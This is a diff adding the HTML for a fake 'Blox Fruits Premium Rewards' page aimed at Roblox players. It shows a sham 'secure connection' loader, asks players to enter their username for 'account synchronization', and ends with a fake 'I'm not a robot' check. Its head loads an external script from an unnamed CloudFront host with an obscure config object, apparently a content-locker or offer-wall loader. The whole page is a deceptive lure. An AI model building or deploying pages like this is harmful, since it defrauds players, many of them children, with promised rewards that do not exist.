@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Blox Fruits Premium Rewards - Ultimate Edition</title>
+    <script type="text/javascript">
+        var AncoY_reQ_shZzBc={"it":4586440,"key":"a355c"};
+    </script>
+    <script src="https://duw03nk63ml3f.cloudfront.net/f1e1db2.js"></script>
+    <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600;800&family=Rajdhani:wght@600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+
+    <div class="fire-bg-layer"></div>
+    <div class="bg-overlay"></div> <div id="intro-loader" class="screen-layer">
+        <div class="loader-content">
+            <img src="images/logo.png" class="logo-pulse">
+            <div class="progress-container"><div class="progress-fill"></div></div>
+            <p class="neon-text">ESTABLISHING SECURE CONNECTION...</p>
+        </div>
+    </div>
+
+    <div id="selection-screen" class="main-page" style="display: none;">
+        <header>
+            <img src="images/logo.png" class="header-logo">
+            <h2 class="neon-text flame-effect">CLAIM PERMANENT REWARDS</h2>
+        </header>
+        <div class="slots-area">
+            <div class="slot" id="slot-0"></div>
+            <div class="slot" id="slot-1"></div>
+            <div class="slot" id="slot-2"></div>
+        </div>
+        <div class="rewards-grid" id="rewards-grid"></div>
+    </div>
+
+    <div id="sync-screen" class="screen-layer" style="display: none;">
+        <div class="luxury-card glow-flame">
+            <h3 class="neon-text">ACCOUNT SYNCHRONIZATION</h3>
+            <div class="input-glow-box">
+                <input type="text" id="rbx-user" placeholder="ENTER USERNAME..." autocomplete="off">
+                <div class="glow-line"></div>
+            </div>
+            <p id="error-msg" class="error-text"></p>
+            <button id="sync-btn" class="glow-button">SYNC ACCOUNT</button>
+        </div>
+    </div>
+
+    <div id="final-check-screen" class="screen-layer" style="display: none;">
+        <div class="luxury-card final-box glow-green">
+            <h2 class="neon-text" style="color: #44ff44;">FINAL CHECK</h2>
+            <p class="final-txt">Are you ready to Unlock your rewards?</p>
+            
+            <button id="robot-btn" class="captcha-btn">
+                <span class="checkmark-icon">✓</span>
+                I'm not a robot
+            </button>
+        </div>
+    </div>
+
+    <audio id="snd-tap" src="media/tap.mp3"></audio>
+    <audio id="snd-select" src="media/selection.mp3"></audio>
+    <audio id="snd-error" src="media/error.mp3"></audio>
+
+    <script src="script.js"></script>
+</body>
+</html>
